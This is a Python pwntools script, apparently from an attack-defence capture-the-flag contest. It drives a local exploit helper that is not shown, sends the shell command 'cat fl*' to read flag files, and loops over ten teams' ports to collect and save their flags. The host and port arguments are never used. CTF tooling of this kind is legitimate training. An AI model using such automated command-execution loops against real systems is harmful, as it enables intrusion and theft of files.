from pwn import *


def get_flag(host,port):
    a = process('./start_tpl.sh')
    data = a.recvline()
    while "Run commands on the operating system"  not in  data:
        data = a.recvline()
        print data.strip()
    a.sendline('cat fl*')
    result = a.recvline()
    start_pos = result.find("HackToday") 
    flag = result[start_pos:]
    print flag

    a.close()
    return flag.strip()
    
    
def loop_through():
    flags = []
    for team in range(1,11):
        # ganti disiniii
        if team >9:
            team_str = str(team)
        else:
            team_str = '0'+str(team)
        port = int("3"+team_str+"01")
        flag = get_flag("agrihack.party",port)
        flags.append(flag.strip())
    return flags

    

def start():
    flags = loop_through()
    count = 1
    file_out = open('out','w')
    for flag in flags:
        file_out.write(flag + ',' +str(count)+',1\n')
        count+=1
    
    
#get_flag("agrihack.party",30108)
start()
